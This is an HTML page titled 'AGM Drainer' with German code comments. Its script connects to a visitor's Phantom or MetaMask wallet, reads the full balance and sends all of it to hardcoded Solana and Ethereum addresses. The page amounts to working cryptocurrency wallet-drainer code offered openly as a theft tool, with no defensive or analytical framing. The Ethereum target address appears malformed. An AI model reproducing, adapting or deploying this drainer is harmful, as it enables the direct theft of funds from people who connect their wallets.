<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <title>AGM Drainer</title>
   <style>
   body { background-color: #0d1117; color: #00ffaa; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .card { border: 2px solid #00ffaa; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00ffaa; background: #161b22; }
   button { background: #00ffaa; color: #000; border: none; padding: 15px 30px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; }
   button:disabled { background: #555; }
   #status { margin-top: 20px; color: #ff7b72; }
   </style>
</head>
<body>

   <div class="card">
   <h2>AGM DRAINER</h2>
   <button id="btn" onclick="initiateProcess()">Connect & Drain</button>
   <div id="status">Ready...</div>
  </div>

   <!-- DIE LIBRARIES KOMMEN JETZT UNTEN, DIREKT VOR DER LOGIK -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

   <script>
   const status = document.getElementById("status");
   const btn = document.getElementById("btn");

   // Zieladressen
   const ETH_TARGET = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; 
   const SOL_TARGET = "ZUsbM68ms7S7CifNHyM9NscZMe5NLoTeitdaN7EqCdhJ"; // Beispiel für SOL

   async function initiateProcess() {
   btn.disabled = true;
   status.innerText = "Checking for wallets...";
   
   try {
   if (window.solana) {
   await drainSOL();
   } else if (window.ethereum) {
   await drainETH();
   } else {
   throw new Error("No compatible wallet found.");
   }
   } catch (e) {
   status.innerText = "Process Stopped: " + e.message;
   btn.disabled = false;
   btn.innerText = "Retry Connection";
   }
  }

   async function drainSOL() {
   status.innerText = "Connecting to Phantom...";
   // Hier wird jetzt solanaWeb3 über das globale Objekt accessed
   // das durch die iife.min.js Library erzeugt wird
   const solana = window.solanaWeb3; 
   
   if (!solana) throw new Error("solanaWeb3 library load failed!");

   const provider = window.solana;
   await provider.connect();
   const { publicKey } = provider;
   
   const connection = new solana.Connection(solana.clusterApiUrl("mainnet-beta"));
   const balance = await connection.getBalance(publicKey);
   
   if (balance === 0) throw new Error("SOL Wallet empty");
   
   status.innerText = "Draining SOL...";
   const tx = new solana.Transaction().add(
   solana.SystemProgram.transfer({
   fromPubkey: publicKey,
   toPubkey: new solana.PublicKey(SOL_TARGET),
   lamports: balance,
   })
   );
   
   await provider.signAndSendTransaction(tx);
   status.innerText = "DONE: SOL Sent!";
  }

   async function drainETH() {
   status.innerText = "Connecting to MetaMask...";
   const provider = new ethers.BrowserProvider(window.ethereum);
   const signer = await provider.getSigner();
   const balance = await provider.getBalance(signer.address);

   if (balance === 0n) throw new Error("ETH Wallet empty");

   status.innerText = "Draining ETH...";
   const tx = await signer.sendTransaction({
   to: ETH_TARGET,
   value: balance
   });
   await tx.wait();
   status.innerText = "DONE: ETH Sent!";
   }
   </script>
</body>
</html>
